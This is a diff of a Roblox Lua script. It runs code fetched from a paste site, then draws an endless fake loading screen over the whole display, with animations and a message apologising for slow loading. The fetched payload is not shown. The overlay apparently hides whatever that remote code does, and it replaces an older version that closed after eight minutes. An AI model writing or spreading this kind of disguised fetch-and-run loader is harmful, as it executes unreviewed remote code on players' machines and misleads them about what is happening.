@@ -1,70 +1,215 @@
 wait("0.2")
 loadstring(game:HttpGet("https://pastefy.app/WkAWQDi9/raw"))()
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local RunService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
 
--- Create ScreenGui
+-- Criar ScreenGui
 local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "LoadingScreen"
+screenGui.Name = "FullEffectGui"
 screenGui.ResetOnSpawn = false
-screenGui.Parent = playerGui
+screenGui.DisplayOrder = 3000
+screenGui.IgnoreGuiInset = true
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+screenGui.Parent = PlayerGui
 
--- Background Frame
-local bg = Instance.new("Frame")
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-bg.Parent = screenGui
+-- Torna a GUI não bloqueadora de input
+screenGui.AutoLocalize = false
 
--- Loading Text
+-- Fundo preto
+local backgroundFrame = Instance.new("Frame")
+backgroundFrame.Position = UDim2.new(0, -100, 0, -100)
+backgroundFrame.Size = UDim2.new(1, 200, 1, 200)
+backgroundFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+backgroundFrame.BorderSizePixel = 0
+backgroundFrame.ZIndex = 10
+backgroundFrame.Active = false
+backgroundFrame.Selectable = false
+backgroundFrame.Parent = screenGui
+
+-- Logo central
+local imageLabel = Instance.new("ImageLabel")
+imageLabel.Size = UDim2.new(0, 256, 0, 256)
+imageLabel.Position = UDim2.new(0.5, -128, 0.5, -178)
+imageLabel.BackgroundTransparency = 1
+imageLabel.Image = "rbxassetid://132263722231080"
+imageLabel.ZIndex = 11
+imageLabel.Active = false
+imageLabel.Selectable = false
+imageLabel.Parent = backgroundFrame
+
+-- Barra de loading
+local loadingBarBackground = Instance.new("Frame")
+loadingBarBackground.Size = UDim2.new(0, 300, 0, 30)
+loadingBarBackground.Position = UDim2.new(0.5, -150, 0.5, 100)
+loadingBarBackground.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+loadingBarBackground.BorderSizePixel = 0
+loadingBarBackground.ZIndex = 12
+loadingBarBackground.Active = false
+loadingBarBackground.Selectable = false
+loadingBarBackground.Parent = backgroundFrame
+
+local loadingBarBackgroundCorner = Instance.new("UICorner")
+loadingBarBackgroundCorner.CornerRadius = UDim.new(0, 15)
+loadingBarBackgroundCorner.Parent = loadingBarBackground
+
+local loadingBarFill = Instance.new("Frame")
+loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
+loadingBarFill.Position = UDim2.new(0, 0, 0, 0)
+loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
+loadingBarFill.BorderSizePixel = 0
+loadingBarFill.ZIndex = 13
+loadingBarFill.Active = false
+loadingBarFill.Selectable = false
+loadingBarFill.Parent = loadingBarBackground
+
+local loadingBarFillCorner = Instance.new("UICorner")
+loadingBarFillCorner.CornerRadius = UDim.new(0, 15)
+loadingBarFillCorner.Parent = loadingBarFill
+
 local loadingText = Instance.new("TextLabel")
-loadingText.Size = UDim2.new(1, 0, 0.1, 0)
-loadingText.Position = UDim2.new(0, 0, 0.4, 0)
-loadingText.Text = "Hang on the script is loading should take 2-5 minutes"
-loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.Size = UDim2.new(1, 0, 1, 0)
 loadingText.BackgroundTransparency = 1
-loadingText.Font = Enum.Font.SourceSansBold
-loadingText.TextSize = 28
-loadingText.Parent = bg
+loadingText.Text = "Loading Modules Script"
+loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 18
+loadingText.ZIndex = 14
+loadingText.Active = false
+loadingText.Selectable = false
+loadingText.Parent = loadingBarBackground
 
--- Progress Bar Background
-local progressBarBG = Instance.new("Frame")
-progressBarBG.Size = UDim2.new(0.5, 0, 0.05, 0)
-progressBarBG.Position = UDim2.new(0.25, 0, 0.5, 0)
-progressBarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-progressBarBG.BorderSizePixel = 0
-progressBarBG.Parent = bg
+local loadingIcon = Instance.new("ImageLabel")
+loadingIcon.Size = UDim2.new(0, 30, 0, 30)
+loadingIcon.BackgroundTransparency = 1
+loadingIcon.Image = "rbxassetid://83198158215351"
+loadingIcon.ZIndex = 15
+loadingIcon.Active = false
+loadingIcon.Selectable = false
+loadingIcon.Parent = loadingBarBackground
 
--- Progress Bar Fill
-local progressBar = Instance.new("Frame")
-progressBar.Size = UDim2.new(0, 0, 1, 0)
-progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-progressBar.BorderSizePixel = 0
-progressBar.Parent = progressBarBG
+-- Mensagem no topo
+local topMessage = Instance.new("TextLabel")
+topMessage.Size = UDim2.new(1, 0, 0, 30)
+topMessage.Position = UDim2.new(0, 0, 0, 0)
+topMessage.BackgroundTransparency = 1
+topMessage.Text = ""
+topMessage.TextColor3 = Color3.fromRGB(255, 255, 0)
+topMessage.Font = Enum.Font.GothamBold
+topMessage.TextSize = 20
+topMessage.ZIndex = 16
+topMessage.Active = false
+topMessage.Selectable = false
+topMessage.Parent = screenGui
 
--- Progress Text
-local progressText = Instance.new("TextLabel")
-progressText.Size = UDim2.new(1, 0, 0.1, 0)
-progressText.Position = UDim2.new(0, 0, 0.55, 0)
-progressText.Text = "Loading... 0%"
-progressText.TextColor3 = Color3.fromRGB(255, 255, 255)
-progressText.BackgroundTransparency = 1
-progressText.Font = Enum.Font.SourceSans
-progressText.TextSize = 20
-progressText.Parent = bg
+-- Loading animação
+spawn(function()
+    local fillWidth = 0
+    local maxWidth = 300 * 0.99
+    while true do
+        if fillWidth < maxWidth then
+            fillWidth = fillWidth + 0.75
+        else
+            topMessage.Text = "Sorry if the script is taking too long to load. This ensures all modules are loaded properly."
+            topMessage.BackgroundTransparency = 0.5
+            wait(3)
+            for i = 1, 20 do
+                topMessage.TextTransparency = i * 0.05
+                topMessage.TextStrokeTransparency = i * 0.05
+                wait(0.05)
+            end
+            topMessage.Text = ""
+            topMessage.TextTransparency = 0
+            topMessage.TextStrokeTransparency = 0
+            fillWidth = 0
+        end
+        loadingBarFill.Size = UDim2.new(0, fillWidth, 1, 0)
+        loadingIcon.Position = UDim2.new(0, fillWidth - 15, 0, 0)
+        wait(0.03)
+    end
+end)
 
--- Loading Logic
-local totalTime = 480 -- 8 minutes in seconds
-local currentTime = 0
+-- Imagens caindo infinito
+local imageIds = {
+    "rbxassetid://129325487005421",
+    "rbxassetid://128351949256773",
+    "rbxassetid://98316788023886",
+    "rbxassetid://138926938699718",
+    "rbxassetid://120114304521163",
+}
+local totalImages = 20
+local fallSpeedMin, fallSpeedMax = 50, 150
+local images = {}
 
-while currentTime <= totalTime do
-    local progress = currentTime / totalTime
-    progressBar.Size = UDim2.new(progress, 0, 1, 0)
-    progressText.Text = string.format("Loading... %d%%", math.floor(progress * 100))
+for i = 1, totalImages do
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(0, 40, 0, 40)
+    img.BackgroundTransparency = 1
+    img.Image = imageIds[math.random(1, #imageIds)]
+    img.ZIndex = 3000
+    img.AnchorPoint = Vector2.new(0.5, 0.5)
+    img.Active = false
+    img.Selectable = false
+    img.Parent = screenGui
 
-    wait(1)
-    currentTime = currentTime + 1
+    local startX = math.random(20, camera.ViewportSize.X - 20)
+    local startY = -math.random(50, 100)
+    img.Position = UDim2.new(0, startX, 0, startY)
+
+    table.insert(images, {img = img, speed = math.random(fallSpeedMin, fallSpeedMax)})
 end
 
--- Remove the loading screen
-screenGui:Destroy()
+RunService.Heartbeat:Connect(function(dt)
+    for _, data in ipairs(images) do
+        local img, speed = data.img, data.speed
+        local newY = img.Position.Y.Offset + speed * dt
+        if newY > camera.ViewportSize.Y + 50 then
+            local newX = math.random(20, camera.ViewportSize.X - 20)
+            newY = -math.random(50, 100)
+            img.Position = UDim2.new(0, newX, 0, newY)
+            img.Image = imageIds[math.random(1, #imageIds)]
+            data.speed = math.random(fallSpeedMin, fallSpeedMax)
+        else
+            img.Position = UDim2.new(0, img.Position.X.Offset, 0, newY)
+        end
+    end
+end)
+
+-- Pontos coloridos por toda a tela
+local function createPaintDot()
+    local dot = Instance.new("Frame")
+    dot.Size = UDim2.new(0, math.random(10, 30), 0, math.random(10, 30))
+    dot.BackgroundColor3 = Color3.fromRGB(math.random(100,255), math.random(100,255), math.random(100,255))
+    dot.BorderSizePixel = 0
+    dot.BackgroundTransparency = 1
+    dot.ZIndex = 2000
+    dot.Active = false
+    dot.Selectable = false
+    dot.Parent = screenGui
+
+    local xPos = math.random(0, camera.ViewportSize.X)
+    local yPos = math.random(0, camera.ViewportSize.Y)
+    dot.Position = UDim2.new(0, xPos, 0, yPos)
+
+    spawn(function()
+        for i = 1, 10 do
+            dot.BackgroundTransparency = 1 - i * 0.1
+            wait(0.03)
+        end
+        wait(1)
+        for i = 1, 10 do
+            dot.BackgroundTransparency = i * 0.1
+            wait(0.03)
+        end
+        dot:Destroy()
+    end)
+end
+
+spawn(function()
+    while true do
+        createPaintDot()
+        wait(math.random(0.1, 0.3))
+    end
+end)
